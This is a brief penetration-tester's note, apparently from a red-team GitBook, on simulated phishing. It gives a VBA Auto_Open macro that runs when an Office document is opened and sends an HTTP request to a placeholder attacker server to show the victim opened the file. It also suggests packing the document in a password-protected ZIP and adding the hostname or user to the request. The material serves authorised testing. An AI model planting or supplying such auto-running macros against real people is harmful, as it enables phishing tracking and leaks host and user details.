# Non-malicious Callback

There have been multiple tests in the past where dropping a shell onto a victims machine is not within scope. In these cases, I often perform a simulated exercise where we have a PoC payload that calls back to our infrastructure, allowing us to verify that someone downloaded and opened the document.

Often times this payload can be delivered in a password protected ZIP file with a macro. I'd never taken the time to actually document the process of doing this until I came across a blog post from  [Hackzzdogz](https://hackzzdogs.gitbook.io/red-team/red-team-blogs/bypassing-microsoft-endpoint-solutions-for-fun). This can be further modified to include additional information in the request such as the hostname of the device of signed in user:

```markup
Sub Auto_Open()
Dim myURL As String
myURL = "$attacker_server"


Dim WinHttpReq as Object
Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
WinHttpReq.Open "GET", myURL, False
WinHttpReq.send
End Sub
```

### References

{% embed url="https://hackzzdogs.gitbook.io/red-team/red-team-blogs/bypassing-microsoft-endpoint-solutions-for-fun" %}

{% embed url="https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/" %}
